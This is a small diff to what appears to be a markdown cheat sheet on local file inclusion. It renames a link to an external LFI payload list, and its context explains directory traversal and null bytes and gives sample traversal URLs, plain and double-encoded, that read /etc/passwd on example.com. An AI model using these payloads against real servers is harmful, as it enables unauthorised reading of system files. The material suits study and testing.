@@ -17,7 +17,7 @@ You can move up directories with ../../../../ -> example.com/index.php?page=./..
 
 %00 = is a null byte, a special character that tells a computer, Stop reading here.
 
-# PAYLOADS [PAYLOADS](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
+# PAYLOADS [link to payloads ](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
 -  example.com/index.php?page=./../../../etc/password 
 # ENCODEED PAYLOADS
 -  http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
